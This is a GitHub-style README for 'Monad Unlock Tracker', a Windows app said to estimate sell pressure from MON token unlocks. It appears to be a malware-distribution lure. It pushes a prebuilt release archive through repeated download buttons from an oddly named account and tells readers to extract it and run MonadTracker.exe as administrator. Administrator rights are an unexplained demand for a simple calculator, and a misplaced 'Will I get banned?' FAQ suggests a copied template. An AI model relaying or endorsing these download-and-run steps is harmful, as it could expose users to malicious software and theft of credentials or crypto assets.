# Monad Unlock Tracker

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop tracker for Monad (MON) token unlocks — calculates sell pressure, tracks linear vesting, and estimates price impact.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Awarenessglimodify/monad-unlock-tracker-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Token unlock tracker for Monad (MON) |
| **Who it's for** | MON holders who want to understand sell pressure |
| **What it solves** | Schedule trackers show dates, not impact |
| **How it works** | Calculator + linear vesting tracker + price impact context |

---

## 🔥 Why This Exists

On November 24, 2026, Monad unlocked **16.61 billion MON** — roughly **$217 million**, or **140% of circulating supply** at the time. It was one of the largest quarterly unlocks.

The cliff is done, but linear vesting continues. After the cliff, tokens release over **3 years** — about **104 million MON per week**.

Most trackers show you the schedule. This one shows you what it means: how much sell pressure hits each week, and what that could do to price.

---

## 🧩 What It Does

### Unlock Calculator
- Input unlock amount and current price
- See dollar value and percentage of circulating supply
- Estimate sell pressure: if 25%, 50%, or 100% of recipients sell

### Linear Vesting Tracker
- Week-by-week schedule for next 3 years
- Flag weeks with largest unlocks
- Export to CSV for planning

### Price Impact Estimator
- Compare past unlocks to price action
- Correlation, not causation — context, not prediction
- Chart of unlock size vs. price change (7-day window)

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Network** | Broadband | Low-latency connection |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `MonadTracker.exe` as administrator
4. **Enter** current MON price and unlock amount
5. **See** sell pressure estimates and vesting schedule

---

## ❓ FAQ

**Does this predict price?**
No — it estimates sell pressure based on unlock size. Price depends on many factors; this is one input, not a guarantee.

**Does it connect to my wallet?**
No — it's a calculator and tracker. No wallet connection, no keys, no transactions.

**How accurate is the vesting schedule?**
Based on Monad's published tokenomics. Linear vesting over 3 years after the cliff. The tracker will be updated if terms change.

**Does it work offline?**
Yes — all calculations are local. Price updates require internet.

**Will I get banned?**
No — this is a standalone desktop app. It doesn't interact with any exchange or wallet.

**How do I uninstall?**
Delete the folder. No registry entries.

---

## 🗺️ Roadmap

- [ ] Multi-token support (other vesting schedules)
- [ ] Telegram alerts for large weekly unlocks
- [ ] Historical price overlay
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Awarenessglimodify/monad-unlock-tracker-2026/releases/tag/1.0.0)

**Version 1.0.0** — Unlock Edition · Sell Pressure Tracker · MIT

</div>
